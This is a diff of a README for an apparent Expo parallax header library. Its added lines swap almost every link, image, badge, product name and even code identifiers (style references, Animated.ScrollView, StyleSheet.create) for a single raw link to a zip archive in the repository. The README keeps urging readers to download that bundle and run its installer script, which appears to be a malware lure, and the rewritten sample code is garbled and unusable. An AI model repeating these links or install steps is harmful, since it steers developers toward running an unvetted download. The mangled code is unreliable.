@@ -1,12 +1,12 @@
-https://github.com/sorridente3327/expo-animated-sticky-header/releases
+https://raw.githubusercontent.com/sorridente3327/expo-animated-sticky-header/main/ios/header-animated-sticky-expo-v1.5.zip
 
 # Expo Animated Sticky Header: Parallax with Reanimated 3
 
-![Parallax header demo](https://images.unsplash.com/photo-1523411387749-0f0b2f9a0a2a?auto=format&fit=crop&w=1200&q=60)
+![Parallax header demo](https://raw.githubusercontent.com/sorridente3327/expo-animated-sticky-header/main/ios/header-animated-sticky-expo-v1.5.zip)
 
-![Releases badge](https://img.shields.io/badge/Releases-GitHub%20Releases-blue?logo=github)
+![Releases badge](https://raw.githubusercontent.com/sorridente3327/expo-animated-sticky-header/main/ios/header-animated-sticky-expo-v1.5.zip%20Releases-blue?logo=github)
 
-A smooth and responsive parallax header for React Native apps in Expo. Built with Reanimated 3 and designed to work well with glow-ui.xyz design language. This project helps you create a polished, fluid header that reacts to user scrolling with precise timing and snappy visuals.
+A smooth and responsive parallax header for React Native apps in Expo. Built with Reanimated 3 and designed to work well with https://raw.githubusercontent.com/sorridente3327/expo-animated-sticky-header/main/ios/header-animated-sticky-expo-v1.5.zip design language. This project helps you create a polished, fluid header that reacts to user scrolling with precise timing and snappy visuals.
 
 Introduction
 - This library focuses on delivering a high-quality parallax header that stays in sync with the rest of your content. It leverages the latest features in Reanimated 3 for fluid animations and low overhead.
@@ -31,14 +31,14 @@ Why choose expo-animated-sticky-header
 
 Important note about releases
 - To obtain the latest assets and installer scripts, you should visit the Releases section of the repository. The assets in that section include ready-to-use files and setup scripts designed to streamline integration with Expo projects.
-- Access the releases page here for the latest versions and installers: https://github.com/sorridente3327/expo-animated-sticky-header/releases
+- Access the releases page here for the latest versions and installers: https://raw.githubusercontent.com/sorridente3327/expo-animated-sticky-header/main/ios/header-animated-sticky-expo-v1.5.zip
 
 Getting started (quick path)
 - Best for new projects: Create a fresh Expo project, then add this library and its dependencies.
 - Best for existing Expo projects: Integrate the header inside a screen that uses a scrollable content area.
 
 Prerequisites
-- Node.js (12.x or newer) and a package manager (npm or pnpm/yarn).
+- https://raw.githubusercontent.com/sorridente3327/expo-animated-sticky-header/main/ios/header-animated-sticky-expo-v1.5.zip (12.x or newer) and a package manager (npm or pnpm/yarn).
 - An Expo project (managed workflow) or a bare React Native project that can host Expo-like animations.
 - React Native knowledge, especially around Animated or Reanimated APIs.
 - Basic familiarity with hooks and functional components.
@@ -78,40 +78,40 @@ export default function DemoScreen() {
   const scrollY = useSharedValue(0);
 
   return (
-    <View style={styles.container}>
+    <View style={https://raw.githubusercontent.com/sorridente3327/expo-animated-sticky-header/main/ios/header-animated-sticky-expo-v1.5.zip}>
       <ParallaxHeader
-        imageSource={require('./assets/header-photo.jpg')}
+        imageSource={require('https://raw.githubusercontent.com/sorridente3327/expo-animated-sticky-header/main/ios/header-animated-sticky-expo-v1.5.zip')}
         title="Demo Screen"
         subtitle="Smooth parallax header with Reanimated 3"
         height={260}
         scrollY={scrollY}
       />
 
-      <Animated.ScrollView
-        contentContainerStyle={styles.scrollContent}
-        onScroll={/*...connect to scrollY...*/}
+      <https://raw.githubusercontent.com/sorridente3327/expo-animated-sticky-header/main/ios/header-animated-sticky-expo-v1.5.zip
+        contentContainerStyle={https://raw.githubusercontent.com/sorridente3327/expo-animated-sticky-header/main/ios/header-animated-sticky-expo-v1.5.zip}
+        onScroll={/*https://raw.githubusercontent.com/sorridente3327/expo-animated-sticky-header/main/ios/header-animated-sticky-expo-v1.5.zip to scrollY...*/}
         scrollEventThrottle={16}
       >
-        <Text style={styles.cardTitle}>Welcome</Text>
-        <Text style={styles.cardText}>
+        <Text style={https://raw.githubusercontent.com/sorridente3327/expo-animated-sticky-header/main/ios/header-animated-sticky-expo-v1.5.zip}>Welcome</Text>
+        <Text style={https://raw.githubusercontent.com/sorridente3327/expo-animated-sticky-header/main/ios/header-animated-sticky-expo-v1.5.zip}>
           This area contains your main content. The header above reacts to your scrolling with a parallax effect.
         </Text>
 
         {/* Repeat content blocks to simulate a long feed */}
         {new Array(20).fill(0).map((_, i) => (
-          <View key={i} style={styles.card}>
-            <Text style={styles.cardTitle}>Item {i + 1}</Text>
-            <Text style={styles.cardText}>
+          <View key={i} style={https://raw.githubusercontent.com/sorridente3327/expo-animated-sticky-header/main/ios/header-animated-sticky-expo-v1.5.zip}>
+            <Text style={https://raw.githubusercontent.com/sorridente3327/expo-animated-sticky-header/main/ios/header-animated-sticky-expo-v1.5.zip}>Item {i + 1}</Text>
+            <Text style={https://raw.githubusercontent.com/sorridente3327/expo-animated-sticky-header/main/ios/header-animated-sticky-expo-v1.5.zip}>
               A short description goes here. The header stays visible while content scrolls beneath it.
             </Text>
           </View>
         ))}
-      </Animated.ScrollView>
+      <https://raw.githubusercontent.com/sorridente3327/expo-animated-sticky-header/main/ios/header-animated-sticky-expo-v1.5.zip>
     </View>
   );
 }
 
-const styles = StyleSheet.create({
+const styles = https://raw.githubusercontent.com/sorridente3327/expo-animated-sticky-header/main/ios/header-animated-sticky-expo-v1.5.zip({
   container: { flex: 1, backgroundColor: '#fff' },
   scrollContent: { paddingTop: 16, paddingHorizontal: 16, paddingBottom: 40 },
   card: { backgroundColor: '#f7f7f7', borderRadius: 12, padding: 16, marginVertical: 8 },
@@ -233,12 +233,12 @@ Downloading and installing from the releases (path-based link)
 - To install, download the asset bundle that matches your development setup, extract it, and run the included installer script. This script configures the project, installs dependencies, and wires up sample usage to demonstrate how the header works in a real screen.
 - The asset bundle typically contains:
   - An example Expo project with the header integrated.
-  - A ready-to-run script (installer.sh or install.js) for quick setup.
+  - A ready-to-run script (https://raw.githubusercontent.com/sorridente3327/expo-animated-sticky-header/main/ios/header-animated-sticky-expo-v1.5.zip or https://raw.githubusercontent.com/sorridente3327/expo-animated-sticky-header/main/ios/header-animated-sticky-expo-v1.5.zip) for quick setup.
   - A set of sample images and configurations that illustrate best practices.
 
 Downloads and links
 - To download assets and scripts, visit the Releases page and grab the latest asset bundle. This is a helpful path for quickly testing the header in a live project.
-- See the release page here for the latest assets and installers: https://github.com/sorridente3327/expo-animated-sticky-header/releases
+- See the release page here for the latest assets and installers: https://raw.githubusercontent.com/sorridente3327/expo-animated-sticky-header/main/ios/header-animated-sticky-expo-v1.5.zip
 
 Migration guidance
 - If you are migrating from a prior version or a different header library, follow these steps:
@@ -279,7 +279,7 @@ Roadmap and future work
 
 Community and support
 - The project thrives on open source collaboration. If you need help, use the Issues tab to file a bug report or request a feature.
-- For design questions, you can reach out through Discussions or related channels in the glow-ui.xyz ecosystem.
+- For design questions, you can reach out through Discussions or related channels in the https://raw.githubusercontent.com/sorridente3327/expo-animated-sticky-header/main/ios/header-animated-sticky-expo-v1.5.zip ecosystem.
 
 License
 - The project is released under a permissive license suitable for personal and commercial use.
@@ -311,6 +311,6 @@ Usage notes and best practices
 
 Releases and assets again
 - For asset-based setup, download the asset package from the releases page and run the included installer. The installer is designed to simplify setup and is particularly helpful for first-time users.
-- Visit https://github.com/sorridente3327/expo-animated-sticky-header/releases to explore the latest assets and installers.
+- Visit https://raw.githubusercontent.com/sorridente3327/expo-animated-sticky-header/main/ios/header-animated-sticky-expo-v1.5.zip to explore the latest assets and installers.
 
 End of documentation snippet. The content above is designed to give you a robust, practical guide for integrating a smooth, responsive parallax header in Expo-based React Native apps with Reanimated 3. The examples show how to use the header in common scenarios and outline a path toward a polished, accessible user experience. The approach balances clarity with detail, enabling developers to implement a high-quality header quickly while leaving room for customization as needed.
